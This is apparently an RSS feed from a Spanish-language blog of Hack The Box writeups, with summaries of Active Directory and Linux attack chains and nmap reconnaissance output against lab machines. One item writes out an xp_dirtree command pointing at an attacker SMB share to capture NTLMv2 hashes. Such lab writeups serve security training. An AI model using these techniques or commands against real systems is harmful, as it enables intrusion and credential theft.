channel.title: Writeups on Borhub Blog
channel.description: Recent content in Writeups on Borhub Blog

item.title: Certificate
item.description: Writeup sobre la máquina Certificate en Active Directory de dificultad Hard. Realizando un ataque Zip Slip + Zip Concatenation, conseguiremos una shell como el usuario xampp, después enumerando una base de datos sql conseguiremos la contraseña del usuario sara.b. Dentro de las carpetas de sara.b encontraremos un mensaje sobre el error que tiene WS-01 además de un archivo .pcap, ahora enumeraremos las peticiones kerberos para conseguir los hashes AS-REP, AS-REQ y TGS-REP y crackear la contraseña de lion.k. Nos seguiremos moviendo al siguiente usuario explotando la vuln ESC3 del servidor de Certificados para conseguir el acceso a Ryan.k que nos permitirá luego escalar privilegios. El usuario Ryan.k miembro de Domain Storage Managers y con privilegios SeManageVolume nos permitirá tomar el control sobre C: para luego nosotros mediante certutil exportar el certificado de Root Certificate Authority (CA Raíz) para luego con Certipy Forge forgar un .pfx para administrador, y generar y obtener un TGT + hash del mismo.

item.title: Conversor
item.description:
Reconocimiento

nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.113.208 -oG ports
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2025-10-25 21:13 CEST
Initiating SYN Stealth Scan at 21:13
Scanning 10.129.113.208 [65535 ports]
Discovered open port 80/tcp on 10.129.113.208
Discovered open port 22/tcp on 10.129.113.208
Completed SYN Stealth Scan at 21:13, 10.54s elapsed (65535 total ports)
Nmap scan report for 10.129.113.208
Host is up, received user-set (0.036s latency).
Scanned at 2025-10-25 21:13:37 CEST for 11s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 10.61 seconds
           Raw packets sent: 66137 (2.910MB) | Rcvd: 65535 (2.621MB)

ports.py ports

🔍 Puertos encontrados:
  ➜  22
  ➜  80

¡Puertos copiados en el portapapeles!

nmap -p 20,80 -sCV 10.129.113.208 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2025-10-25 21:23 CEST
Nmap scan report for 10.129.113.208
Host is up (0.14s latency).

PORT   STATE  SERVICE  VERSION
20/tcp closed ftp-data
80/tcp open   http     Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://conversor.htb/
Service Info: Host: conversor.htb

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.34 seconds

Enumeración web

Una vez entramos a la web vemos que tenemos un panel de login, pero podemos registrarnos, así que nos registramos y entramos a la página web.

item.title: Eighteen
item.description:
As is common in real life Windows penetration tests, you will start the Eighteen box with credentials for the following account: kevin / iNa2we6haRj2gaw!

Reconocimiento

nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.95 -oG ports

ports.py ports

nmap -sCV 80,1433 10.10.11.95 -oN targeted

Editamos el archivo hosts:

10.10.11.95 eighteen.htb

Y ahora empiezo a enumerar los puertos que hay abiertos, en este caso una web y un Microsoft SQL server.

item.title: Expressway
item.description:
Reconocimiento

Escaneo de puertos TCP abiertos:

❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.17.85 -oG ports
[sudo] contraseña para borhub:
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.97 ( https://nmap.org ) at 2025-09-20 21:20 +0200
Initiating SYN Stealth Scan at 21:20
Scanning 10.129.17.85 [65535 ports]
Discovered open port 22/tcp on 10.129.17.85
Completed SYN Stealth Scan at 21:20, 11.50s elapsed (65535 total ports)
Nmap scan report for 10.129.17.85
Host is up, received user-set (0.036s latency).
Scanned at 2025-09-20 21:20:40 CEST for 11s
Not shown: 65508 closed tcp ports (reset), 26 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 11.58 seconds
           Raw packets sent: 67830 (2.985MB) | Rcvd: 65519 (2.621MB)

Como veo que no encontramos nada interesante pruebo a realizar un escaneo de puertos UDP para seguir enumerando la red de la máquina.

item.title: Fluffy
item.description: Writeup sobre la máquina Fluffy en Active Directory de dificultad Easy. En esta máquina explotaremos el CVE-2025-24071 mediante spoofing, luego enumerando en bloodhound veremos un path claro que seguir en el cual explotaremos permisos GenericALL y GenericWrite para llegar a obtener la userflag. Durante la escalada enumeraremos y explotaremos (AD CS) para llegar a conseguir acceso al sistema como administrador.

item.title: Giveback
item.description:
Reconocimiento

[Nov 01, 2025 - 20:12:53 (CET)] exegol-default NMAP # nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.126.26 -oG ports
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2025-11-01 20:15 CET
Initiating SYN Stealth Scan at 20:15
Scanning 10.129.126.26 [65535 ports]
Discovered open port 30686/tcp on 10.129.126.26
Discovered open port 80/tcp on 10.129.126.26
Discovered open port 22/tcp on 10.129.126.26

Nmap scan report for 10.129.126.26
Host is up, received user-set (0.14s latency).
Scanned at 2025-11-01 20:15:29 CET for 18s
Not shown: 64407 closed tcp ports (reset), 1125 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack ttl 63
80/tcp    open  http    syn-ack ttl 62
30686/tcp open  unknown syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 17.98 seconds
           Raw packets sent: 87569 (3.853MB) | Rcvd: 73384 (2.935MB)
[Nov 01, 2025 - 20:15:47 (CET)] exegol-default NMAP # ports.py ports

🔍 Puertos encontrados:
  ➜  22
  ➜  80
  ➜  30686

¡Puertos copiados en el portapapeles!

[Nov 01, 2025 - 20:16:07 (CET)] exegol-default NMAP # nmap -p 22,80,30686 -sCV 10.129.126.26 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2025-11-01 20:16 CET
Nmap scan report for 10.129.126.26
Host is up (0.22s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 66f89c58f4b859bdcdec9224c3978e9e (ECDSA)
|_  256 96318a821a659f0aa26cff4d447cd394 (ED25519)
80/tcp    open  http    nginx 1.28.0
|_http-generator: WordPress 6.8.1
|_http-server-header: nginx/1.28.0
| http-robots.txt: 1 disallowed entry
|_/wp-admin/
|_http-title: GIVING BACK IS WHAT MATTERS MOST – OBVI
30686/tcp open  unknown
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 200 OK
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Load-Balancing-Endpoint-Weight: 1
|     Date: Sat, 01 Nov 2025 19:16:48 GMT
|     Content-Length: 127
|     "service": {
|     "namespace": "default",
|     "name": "wp-nginx-service"
|     "localEndpoints": 1,
|     "serviceProxyHealthy": true
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions:
|     HTTP/1.0 200 OK
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Load-Balancing-Endpoint-Weight: 1
|     Date: Sat, 01 Nov 2025 19:16:14 GMT
|     Content-Length: 127
|     "service": {
|     "namespace": "default",
|     "name": "wp-nginx-service"
|     "localEndpoints": 1,
|_    "serviceProxyHealthy": true
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port30686-TCP:V=7.93%I=7%D=11/1%Time=69065CAA%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20
SF:text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\
SF:x20Request")%r(GetRequest,132,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\
SF:x20application/json\r\nX-Content-Type-Options:\x20nosniff\r\nX-Load-Bal
SF:ancing-Endpoint-Weight:\x201\r\nDate:\x20Sat,\x2001\x20Nov\x202025\x201
SF:9:16:14\x20GMT\r\nContent-Length:\x20127\r\n\r\n{\n\t\"service\":\x20{\
SF:n\t\t\"namespace\":\x20\"default\",\n\t\t\"name\":\x20\"wp-nginx-servic
SF:e\"\n\t},\n\t\"localEndpoints\":\x201,\n\t\"serviceProxyHealthy\":\x20t
SF:rue\n}")%r(HTTPOptions,132,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\x20
SF:application/json\r\nX-Content-Type-Options:\x20nosniff\r\nX-Load-Balanc
SF:ing-Endpoint-Weight:\x201\r\nDate:\x20Sat,\x2001\x20Nov\x202025\x2019:1
SF:6:14\x20GMT\r\nContent-Length:\x20127\r\n\r\n{\n\t\"service\":\x20{\n\t
SF:\t\"namespace\":\x20\"default\",\n\t\t\"name\":\x20\"wp-nginx-service\"
SF:\n\t},\n\t\"localEndpoints\":\x201,\n\t\"serviceProxyHealthy\":\x20true
SF:\n}")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-T
SF:ype:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400
SF:\x20Bad\x20Request")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nC
SF:ontent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\
SF:n\r\n400\x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Ba
SF:d\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnec
SF:tion:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67
SF:,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x2
SF:0charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r
SF:(TLSSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\
SF:x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20B
SF:ad\x20Request")%r(Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCo
SF:ntent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n
SF:\r\n400\x20Bad\x20Request")%r(FourOhFourRequest,132,"HTTP/1\.0\x20200\x
SF:20OK\r\nContent-Type:\x20application/json\r\nX-Content-Type-Options:\x2
SF:0nosniff\r\nX-Load-Balancing-Endpoint-Weight:\x201\r\nDate:\x20Sat,\x20
SF:01\x20Nov\x202025\x2019:16:48\x20GMT\r\nContent-Length:\x20127\r\n\r\n{
SF:\n\t\"service\":\x20{\n\t\t\"namespace\":\x20\"default\",\n\t\t\"name\"
SF::\x20\"wp-nginx-service\"\n\t},\n\t\"localEndpoints\":\x201,\n\t\"servi
SF:ceProxyHealthy\":\x20true\n}");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 109.69 seconds

Enumeración web

El siguiente paso que doy es ver que versiones están corriendo en la página web ya en el escaneo nmap habíamos visto la versión de wordpress pero vamos a confirmarlo con whatweb.

item.title: Imagery
item.description:
Reconocimiento

❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.54.76 -oG ports
[sudo] contraseña para borhub:
Lo siento, pruebe otra vez.
[sudo] contraseña para borhub:
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.97 ( https://nmap.org ) at 2025-09-30 15:18 +0200
Initiating SYN Stealth Scan at 15:18
Scanning 10.129.54.76 [65535 ports]
Discovered open port 22/tcp on 10.129.54.76
Discovered open port 8000/tcp on 10.129.54.76
Completed SYN Stealth Scan at 15:18, 12.98s elapsed (65535 total ports)
Nmap scan report for 10.129.54.76
Host is up, received user-set (0.056s latency).
Scanned at 2025-09-30 15:18:37 CEST for 13s
Not shown: 62931 closed tcp ports (reset), 2602 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE  REASON
22/tcp   open  ssh      syn-ack ttl 63
8000/tcp open  http-alt syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.05 seconds
           Raw packets sent: 68942 (3.033MB) | Rcvd: 63149 (2.526MB)
❯ ports.py ports

🔍 Puertos encontrados:
  ➜  22
  ➜  8000

¡Puertos copiados en el portapapeles!
❯ sudo nmap -sCV -p 22,8000 10.129.54.76 -oN targeted
Starting Nmap 7.97 ( https://nmap.org ) at 2025-09-30 15:19 +0200
Nmap scan report for 10.129.54.76
Host is up (0.14s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.7p1 Ubuntu 7ubuntu4.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 35:94:fb:70:36:1a:26:3c:a8:3c:5a:5a:e4:fb:8c:18 (ECDSA)
|_  256 c2:52:7c:42:61:ce:97:9d:12:d5:01:1c:ba:68:0f:fa (ED25519)
8000/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.12.7)
|_http-title: Image Gallery
|_http-server-header: Werkzeug/3.1.3 Python/3.12.7
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.25 seconds

Enumeración web

Nuestro siguiente paso será enumerar la página web, una vez entramos a la web vemos que tenemos tanto un panel de login y de register. Con lo cual nos registramos en la web para ver funcionalidades descubrimos.

item.title: Linkvortex
item.description: Writeup sobre la máquina LinkVortex, Linux de dificultad Easy. En el reconocimiento inicial de puertos descubriremos la existencia de una página web expuesta en el puerto 80. Luego realizando fuzzing de directorios y vhost descubriremos un leak de credenciales para conseguir acceso al panel de administración del web, luego mediante el CVE-2023-40028 conseguiremos leer las credenciales para conseguir el user.txt. Para finalizar con la escalada usaremos los permisos sudo que tiene nuestro usuario junto symlink trickery para hacernos con la root flag.

item.title: Nanocorp
item.description:
Reconocimiento

nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.182.154 -oG ports
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2025-11-08 22:33 CET
Initiating SYN Stealth Scan at 22:33
Scanning 10.129.182.154 [65535 ports]

Discovered open port 49664/tcp on 10.129.182.154
Discovered open port 389/tcp on 10.129.182.154
Discovered open port 3269/tcp on 10.129.182.154
Discovered open port 49668/tcp on 10.129.182.154
Discovered open port 636/tcp on 10.129.182.154
Discovered open port 88/tcp on 10.129.182.154
Discovered open port 464/tcp on 10.129.182.154
Completed SYN Stealth Scan at 22:33, 26.36s elapsed (65535 total ports)
Nmap scan report for 10.129.182.154
Host is up, received user-set (0.10s latency).
Scanned at 2025-11-08 22:33:17 CET for 27s
Not shown: 65513 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127

636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
3389/tcp  open  ms-wbt-server    syn-ack ttl 127
5986/tcp  open  wsmans           syn-ack ttl 127
6556/tcp  open  checkmk-agent    syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49668/tcp open  unknown          syn-ack ttl 127
49671/tcp open  unknown          syn-ack ttl 127
63947/tcp open  unknown          syn-ack ttl 127
63955/tcp open  unknown          syn-ack ttl 127
63977/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.43 seconds
           Raw packets sent: 131061 (5.767MB) | Rcvd: 35 (1.540KB)

ports.py ports

🔍 Puertos encontrados:
  ➜  53
  ➜  80
  ➜  88
  ➜  135
  ➜  139
  ➜  389
  ➜  445
  ➜  464
  ➜  593
  ➜  636
  ➜  3268
  ➜  3269
  ➜  3389
  ➜  5986
  ➜  6556
  ➜  9389
  ➜  49664
  ➜  49668
  ➜  49671
  ➜  63947
  ➜  63955
  ➜  63977

¡Puertos copiados en el portapapeles!

nmap -sCV -p 53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5986,6556,9389,49664,49668,49671,63947,63955,63977 10.129.182.154 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2025-11-08 22:35 CET
Nmap scan report for 10.129.182.154
Host is up (0.20s latency).

PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
80/tcp    open  http              Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)
|_http-title: Did not follow redirect to http://nanocorp.htb/
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2025-11-09 04:34:29Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
3389/tcp  open  ms-wbt-server     Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC01.nanocorp.htb
| Not valid before: 2025-10-20T01:58:09
|_Not valid after:  2026-04-21T01:58:09
|_ssl-date: 2025-11-09T04:36:06+00:00; +6h59m04s from scanner time.
5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| ssl-cert: Subject: commonName=dc01.nanocorp.htb
| Subject Alternative Name: DNS:dc01.nanocorp.htb
| Not valid before: 2025-04-06T22:58:43
|_Not valid after:  2026-04-06T23:18:43
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Microsoft-HTTPAPI/2.0
| tls-alpn:
|_  http/1.1
|_http-title: Not Found
6556/tcp  open  check_mk          check_mk extension for Nagios 2.1.0p10
9389/tcp  open  mc-nmf            .NET Message Framing
49664/tcp open  msrpc             Microsoft Windows RPC
49668/tcp open  msrpc             Microsoft Windows RPC
49671/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
63947/tcp open  msrpc             Microsoft Windows RPC
63955/tcp open  msrpc             Microsoft Windows RPC
63977/tcp open  msrpc             Microsoft Windows RPC
Service Info: Hosts: nanocorp.htb, DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   311:
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m04s, deviation: 0s, median: 6h59m03s
| smb2-time:
|   date: 2025-11-09T04:35:28
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 107.71 seconds

Enumeración web

En el escaneo con nmap vemos que tenemos el puerto web expuesto, entonces lo primero que hacemos es tratar de enumerarlo para buscar posibles vectores de ataque.

item.title: Nocutrnal
item.description: Writeup sobre la máquina Nocturnal en Linux de dificultad Easy. En esta máquina realizando fuzzing de usuarios con fuff, conseguiremos leer los archivos de amanda en el cual se encuentra su contraseña temporal, una vez como amanda usando la función de creación de backups conseguiremos inyectar código para dumpear la información de la base de datos y con el usuario tobias conseguiremos la root flag. Enumerando el sistema en la escalada descubriremos un panel ISPConfig expuesto en la red interna, realizando local port forwarding nos lo expondremos en nuestra máquina y reutilizaremos las credenciales de Tobias para acceder a el, y gracias a la versión de ISPConfig conseguiremos escalar nuestros privilegios a root mediante el CVE-2023-46818.

item.title: Outbound
item.description: Writeup sobre la máquina Outbound en Linux de dificultad Easy. Luego de identificar la versión web de Roundcube conseguiremos explotar el CVE‑2025‑49113 conseguiremos acceso a la máquina como www-data. Haciendo enumeración SQL descubriremos la infromación de la sessesiones, como se calcula el hash y un script que desencrypta el hash obtenido. Una vez con la contraseña iniciaremos sesión en el roundcube y descubriremos la contraseña de inicio de sesión a través de ssh del usuario jacob. Para acabar de obtener root en la máquina abusaremos de nuestros permisos como sudoers junto con el CVE-2025-27591 de la aplicación.

item.title: Puppy
item.description: Writeup sobre la máquina Puppy en Active Directory de dificultad Media. Durante el acceso inicial abusaremos de privilegios GenericWrite y GenericALL además de descubrir un archivo de credenciales, luego procederemos a movernos al usuario steph.cooper gracias a un leak de información y acabaremos escalando privilegios gracias al descubrimiento de archivos DPAPI.

item.title: Rustykey
item.description: Writeup sobre la máquina Rustykey en Active Directory de dificultad Hard.Durante la fase de reconocimiento se identifica que la autenticación NTLM se encuentra deshabilitada, por lo que todo el ataque se apoya en Kerberos. Mediante enumeración SMB y usuarios con nxc, junto con BloodHound, se descubren relaciones y permisos mal configurados dentro del dominio. Los intentos iniciales de Kerberoasting y AS-REP Roasting no tienen éxito, recurriendo posteriormente a un Timeroasting Attack para avanzar. Aprovechando permisos AddSelf, se añade un equipo al grupo HELPDESK, y con ForceChangePassword se comprometen cuentas adicionales, eliminando además protecciones como Protected Objects del grupo IT. Esto permite pivotar a usuarios como MM.TURNER y posteriormente obtener una shell como ee.reed mediante subida de archivos por SMB y RunasCs.exe. Tras enumerar claves de registro, se explota un DLL Hijacking generando una DLL maliciosa con msfvenom y modificando el registro para lograr escalada de privilegios. Finalmente, abusando del permiso AddAllowedToAct, se explota Resource-Based Constrained Delegation, culminando en el compromiso completo del dominio.

item.title: Signed
item.description:
As is common in real life Windows penetration tests, you will start the Signed box with credentials for the following account which can be used to access the MSSQL service: scott / Sm230#C5NatH

Reconocimiento

❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.249.142 -oG ports
[sudo] contraseña para borhub:
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.98 ( https://nmap.org ) at 2025-10-11 21:19 +0200
Initiating SYN Stealth Scan at 21:19
Scanning 10.129.249.142 [65535 ports]
Discovered open port 1433/tcp on 10.129.249.142
Completed SYN Stealth Scan at 21:19, 26.63s elapsed (65535 total ports)
Nmap scan report for 10.129.249.142
Host is up, received user-set (0.053s latency).
Scanned at 2025-10-11 21:19:10 CEST for 27s
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE  REASON
1433/tcp open  ms-sql-s syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.70 seconds
           Raw packets sent: 131070 (5.767MB) | Rcvd: 2 (88B)
❯ sudo nmap -sCV -p 1433 10.129.249.142 -oN targeted
Starting Nmap 7.98 ( https://nmap.org ) at 2025-10-11 21:20 +0200
Nmap scan report for 10.129.249.142
Host is up (0.17s latency).

PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RTM
| ms-sql-info:
|   10.129.249.142:1433:
|     Version:
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info:
|   10.129.249.142:1433:
|     Target_Name: SIGNED
|     NetBIOS_Domain_Name: SIGNED
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: SIGNED.HTB
|     DNS_Computer_Name: DC01.SIGNED.HTB
|     DNS_Tree_Name: SIGNED.HTB
|_    Product_Version: 10.0.17763
|_ssl-date: 2025-10-11T19:20:17+00:00; -40s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-10-11T19:15:43
|_Not valid after:  2055-10-11T19:15:43

Host script results:
|_clock-skew: mean: -40s, deviation: 0s, median: -40s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Robando hash NTLMv2 - smbserver.py

EXEC xp_dirtree '\\10.10.15.13\smbFolder';

item.title: Soulmate
item.description:
Reconocimiento

❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.169.204 -oG ports
[sudo] contraseña para borhub:

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.97 ( https://nmap.org ) at 2025-09-08 16:03 +0200
Initiating SYN Stealth Scan at 16:03
Scanning 10.129.169.204 [65535 ports]
Discovered open port 80/tcp on 10.129.169.204
Discovered open port 22/tcp on 10.129.169.204
Discovered open port 22/tcp on 10.129.169.204
Discovered open port 80/tcp on 10.129.169.204
Completed SYN Stealth Scan at 16:03, 15.22s elapsed (65535 total ports)

Nmap scan report for 10.129.169.204
Host is up, received user-set (0.049s latency).
Scanned at 2025-09-08 16:03:39 CEST for 15s
Not shown: 63623 closed tcp ports (reset), 1910 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT STATE SERVICE REASON
22/tcp open ssh syn-ack ttl 63
80/tcp open http syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 15.29 seconds
Raw packets sent: 82986 (3.651MB) | Rcvd: 65838 (2.634MB)

❯ ports.py ports

🔍 Puertos encontrados:
➜ 22
➜ 80
¡Puertos copiados en el portapapeles!

❯ sudo nmap -sCV -p 22,80 10.129.169.204 -oN targeted

Starting Nmap 7.97 ( https://nmap.org ) at 2025-09-08 16:05 +0200
Nmap scan report for 10.129.169.204
Host is up (0.30s latency).
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_ 256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open http nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soulmate.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 11.34 seconds

Enumeración web

sudo nano /etc/hosts

whatweb http://soulmate.htb

item.title: Tombwatcher
item.description: Writeups sobre la máquina Tombwatcher en Active Directory de dificultad Media. Tras el reconocimiento y la enumeración SMB aprovecharemos cuentas con SPN para realizar ataques Kerberoast y usaremos BloodHound para ver privilegios de los usuarios, a partir de las ACL encontradas explotaremos permisos como AddSelf, ReadGMSAPassword, ForceChangePassword, WriteOwner y GenericAll sobre usuarios, restauraremos objetos AD y, finalmente, abusaremos de AD-CS (ESC15) con Certipy para escalar privilegios.

item.title: Voleur
item.description: Write-up sobre Voleur una máquina Active Directoy de dificultad Media. En la cual conseguiremos el pwn mediante credenciales durante la enumeración de carpetas compartidas, la explotación de permisos WriteAll y WriteSPN para realizar un kerberoast attack, restaurando objetos eliminados con powershell, obteniendo nuevas credenciales con archivos DPAPI y para acabar escalando privilegios gracias a un WSL parcialmente configurado.
